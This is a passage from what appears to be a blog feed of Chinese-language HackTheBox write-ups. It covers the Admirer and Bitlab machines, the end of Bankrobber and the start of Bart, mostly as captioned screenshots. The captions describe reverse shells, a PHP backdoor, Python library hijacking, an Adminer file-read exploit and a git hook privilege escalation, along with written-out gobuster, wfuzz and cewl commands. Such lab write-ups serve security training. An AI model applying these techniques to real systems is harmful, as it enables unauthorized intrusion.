                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.40vr4g5skkq0.webp"
                     
                ></p>
<p>得到最大值为32，32以后的地方就会被覆盖</p>
<p>让其执行msf的反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1libjs435j0g.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.132yvldh0asg.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.5askizlbt680.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Admirer - HackTheBox</title>
    <url>/post/817e25a1d628/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.4uk6phz702o0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.1ricmoygqw5c.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.bmvrrs4u1tc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.3t0kjyjldlu0.webp"
                     
                ></p>
<p>访问80端口下的robots.txt</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.3g02uoaokoi0.webp"
                     
                ></p>
<p>发现一个目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.1ved76rv8deo.webp"
                     
                ></p>
<p>扫一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.5hwkraorbb80.webp"
                     
                ></p>
<p>扫到一个txt</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.mfm9hedg4ls.webp"
                     
                ></p>
<p>好像没什么用</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.3c6x2un2iri0.webp"
                     
                ></p>
<p>robots.txt里面这句话说有两个txt文件，但只扫到了一个，另外一个貌似是creds相关的，creds是资格证书的缩写，尝试全称访问一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.4qrtajtbf3q0.webp"
                     
                ></p>
<p>获得一些账号密码，有个FTP的账号密码可以试试</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.udupv1canzk.webp"
                     
                ></p>
<p>发现两个文件，get下来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.1fm4pmrrac1s.webp"
                     
                ></p>
<p>sql文件里面没可利用信息，只有一个数据库名字</p>
<p>压缩包解压缩后</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.2dnbgrmvw5jw.webp"
                     
                ></p>
<p>这个robots和访问到的又不一样</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.2528n0plodj4.webp"
                     
                ></p>
<p>可能这俩文件又和访问到的不一样</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.5j5korpdf9g0.webp"
                     
                ></p>
<p>第一个是一样的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.1isjnp2rs7k0.webp"
                     
                ></p>
<p>第二个明显多了一条，但还是没法突破下一步</p>
<p>在utility-scripts目录下找到一些php文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.3m8a55w0m4q0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.fgj9n4bybso.webp"
                     
                ></p>
<p>访问后，是一个类似于查看信息的页面，没法闭合rce</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.5nxhqoz1l700.webp"
                     
                ></p>
<p>又发现一个账号密码，怎么这么多啊</p>
<p>尝试用这个和ftp的账号密码登陆一下ssh</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.tdpt8b8wg0g.webp"
                     
                ></p>
<p>ftp账号拒绝登录，waldo密码不对</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.2u6tu42kkuw0.webp"
                     
                ></p>
<p>剩下俩文件也没信息，网上搜了一下，说是utility-scripts目录下还有个php文件，但我字段扫不出来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.435dolkmr2w0.webp"
                     
                ></p>
<p>存在adminer.php文件，左上角表明为adminer</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.rwckyop5owg.webp"
                     
                ></p>
<p>搜一下有无exp</p>
<p><code>https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.5xdhlrzfezc0.webp"
                     
                ></p>
<p>类似于将本地的数据库进行远程共享，达到读取文件的目的</p>
<p>先把mysql开起来，创建一个数据库和连接用户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.2jhfv4apfsc0.webp"
                     
                ></p>
<p>在修改一下mysql的监听地址</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.102yc4xlnlr4.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.36cw83wytu00.webp"
                     
                ></p>
<p>重新启动mysql</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.3ot1965bfrk0.webp"
                     
                ></p>
<p>返回登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.3huu5taq73o0.webp"
                     
                ></p>
<p>server填攻击机的IP地址</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.gmvhnul9d9c.webp"
                     
                ></p>
<p>登录后先创建一个表</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.3h3uwuoawjc0.webp"
                     
                ></p>
<p>将type类型修改为text</p>
<p>然后执行sql语句</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.75su8fup3u80.webp"
                     
                ></p>
<p>应该是权限不足，不能读取passwd，换成index.php试一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.6yxw46wriog0.webp"
                     
                ></p>
<p>读到了，去看一下表里面的数据</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.3kbcuma7a6w0.webp"
                     
                ></p>
<p>又读到了一个账号密码，尝试ssh登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.44xdqoclqso0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.7h4drjcuzb80.webp"
                     
                ></p>
<p>有一个sudo权限的文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.7b3kbr0aj840.webp"
                     
                ></p>
<p>看一下内容</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.32arvu14af40.webp"
                     
                ></p>
<p>貌似引用了该目录下的一个py文件</p>
<p>在看看python文件内容</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.22spmh80z6gw.webp"
                     
                ></p>
<p>好像又是一个路径劫持</p>
<p>在攻击机创建一个反弹shell的shutil名字的python文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.1lwawb3fi1pc.webp"
                     
                ></p>
<p>由于python开启http服务也需要引用到shutil.py文件，如果名字相同就开不了http服务</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.1aop5l1xxuu8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.127nntj1u7og.webp"
                     
                ></p>
<p>然后就是添加python的环境变量，选择shutil.py所在的目录，以及sh文件的绝对路径</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.kgffx92kgrk.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Admirer/image.ve363p5k5hs.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Bitlab - HackTheBox</title>
    <url>/post/427daae154a1/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.298huvyoic2s.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.5vmrmmewa9g0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.5g9717e3z50.webp"
                     
                ></p>
<p>访问80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.204pjd36ubi8.webp"
                     
                ></p>
<p>一个登录框，这个页面貌似见过，在看看robots.txt</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.73j44oit3bg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.s5zyoi2npq8.webp"
                     
                ></p>
<p>在help目录下发现一个html</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.5ygvhinatr00.webp"
                     
                ></p>
<p>进去后前四个都可以点击跳转，第五个是一段js代码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.103xs8bw2wg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.4zwl2633jg00.webp"
                     
                ></p>
<p>看不明白</p>
<p>搜了一下，这玩意右键把他添加到书签</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.4f7pdfuwnqw0.webp"
                     
                ></p>
<p>然后在登录页面点击他</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.6wvneqrcw4w0.webp"
                     
                ></p>
<p>就会自动填充账号密码，看看密码是啥</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.2u70xbz4k1g0.webp"
                     
                ></p>
<p>审查元素中把password的类型修改为text</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.6equ0r8g6240.webp"
                     
                ></p>
<p>发现两个项目</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.36546yygdqu0.webp"
                     
                ></p>
<p>这个profile的项目可以编辑，并且我记得robots.txt里面有见过这个目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.2n5oeh5lh4q0.webp"
                     
                ></p>
<p>访问看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.6u05xbex2600.webp"
                     
                ></p>
<p>确实是这个，在里面加个php后门代码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.m1u06b4rndo.webp"
                     
                ></p>
<p>在body里面加</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.39vtck7596g0.webp"
                     
                ></p>
<p>保存</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.2hy7a9wnpp40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.5xxo9p0ics40.webp"
                     
                ></p>
<p>然后合并</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.2xgvxq28bvk0.webp"
                     
                ></p>
<p>反弹个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.e0n7iknpc6g.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.29g2st2vqd8g.webp"
                     
                ></p>
<p>git pull有sudo权限</p>
<p>把网站目录下的文件复制一份到<code>/dev/shm</code>目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.4vwmpat0s0i0.webp"
                     
                ></p>
<p>然后创建一个文件链接</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.5iug4wwhjtk0.webp"
                     
                ></p>
<p>然后在本地创建一个<code>post-merge</code>文件，内容为反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.2ze0bhjhb3u0.webp"
                     
                ></p>
<p>让靶机下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.71uk4xixf4g0.webp"
                     
                ></p>
<p>添加执行权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.349o2kee5si0.webp"
                     
                ></p>
<p>回到profile目录下，执行git pull</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.47gk4xnjzw80.webp"
                     
                ></p>
<p>回到网站随便创建一个文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.53r804sgqsw0.webp"
                     
                ></p>
<p>提交合并</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.afya3gp45go.webp"
                     
                ></p>
<p>在执行git pull</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.6kstzutmc3k0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.7izqcc0bsa80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.3k23nc9xqls0.webp"
                     
                ></p>
<hr>
<p>官方还有一种解法是缓冲区溢出</p>
<p><code>https://ivanitlearning.wordpress.com/2020/10/22/hackthebox-bitlab/</code></p>
<p>大致流程是，在靶机上有docker容器，容器中运行有postgresql数据库，通过端口映射到本地进行连接数据库，在数据库中可以发现clave用户的密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.1osvdfrvlfy8.webp"
                     
                ></p>
<p>通过切换到clave用户，在家目录下有一个exe文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.ose94tq946o.webp"
                     
                ></p>
<p>这个执行程序通过缓冲区溢出后，会爆出root的ssh连接密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bitlab/image.5wkqjuj7z5o0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Bart - HackTheBox</title>
    <url>/post/eb3d770b2485/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.3mutvpdp2pa0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.6kknsa2iew80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.gctxibzdf2o.webp"
                     
                ></p>
<p>只有一个80端口，发现一个域名，添加到hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.2kuvb0h3doc0.webp"
                     
                ></p>
<p>纯静态页面</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.5998ej8i1sw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.1i7a02sfuhmo.webp"
                     
                ></p>
<p>这里发现一堆名字，和一个子域名，保存一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.44l2niaia0o0.webp"
                     
                ></p>
<p>将页面下载下来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.1yim5uhmhm00.webp"
                     
                ></p>
<p>保留名字</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.4qmlf96u5540.webp"
                     
                ></p>
<p>俩俩拆分同样保存</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.16ice3ws55mo.webp"
                     
                ></p>
<p>目录也没扫描出可利用信息，爆破一下子域名</p>
<p><code>gobuster vhost -u http://bart.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.2r45l7dbamw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.58me15y6on40.webp"
                     
                ></p>
<p>没有爆出来，换wfuzz</p>
<p><code>wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ &gt; host.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.3bm8ovz1g9q0.webp"
                     
                ></p>
<p>只筛选结果为301跳转的状态码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.2lmu02gorkw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.3vm7kg8v00m0.webp"
                     
                ></p>
<p>一个登录框</p>
<p>在前面下载index.html中获取到，站点由wordpress搭建</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.6ndhk94lgt00.webp"
                     
                ></p>
<p>wordpress可以通过找回密码来判断用户名是否存在</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.55tk96w3nm80.webp"
                     
                ></p>
<p>利用之前保存的用户名去猜测存在的用户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.1e4uraxqcjy.webp"
                     
                ></p>
<p>最终得到Harvey用户存在，尝试将页面单词当作字典</p>
<p><code>cewl http://forum.bart.htb/ &gt; pass.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.2tlycxj3vt00.webp"
                     
                ></p>
<p>但是该页面存在CSRF Token，爆破不了，手动尝试</p>
<p>最终结果为potter，他妈的居然是个小写</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.6dwepgtbrn00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.5mduzetisp40.webp"
                     
                ></p>
<p>又一个子域名</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.6n9jrvnx61w0.webp"
                     
                ></p>
<p>又一个登录框</p>
<p>potter上不去了</p>
<p>扫一下这个域名的目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.bme1q42cqpc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.5q3nyuh24go.webp"
                     
                ></p>
<p>扫描到了一个注册页面</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.5fa8xjgi50g0.webp"
                     
                ></p>
<p>但无法直接访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.6f3mtyz1c0s0.webp"
                     
                ></p>
<p>通过搜索url关键字，获取到了github上的源码</p>
<p><code>https://github.com/magkopian/php-ajax-simple-chat</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.1p4sa630gn28.webp"
                     
                ></p>
<p>注册页面是由post提交用户名和密码即可，密码要求最少八位</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.5es4pf4lj9s0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.ihc5z1zy87s.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.3s1wtgvrne00.webp"
                     
                ></p>
<p>xss不执行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.60nuc7rmqz40.webp"
                     
                ></p>
<p>抓取获取到该页面下有一个log.txt文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.74wjkko2q240.webp"
                     
                ></p>
<p>这里貌似记录了请求信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.1fh3xk0pnikg.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
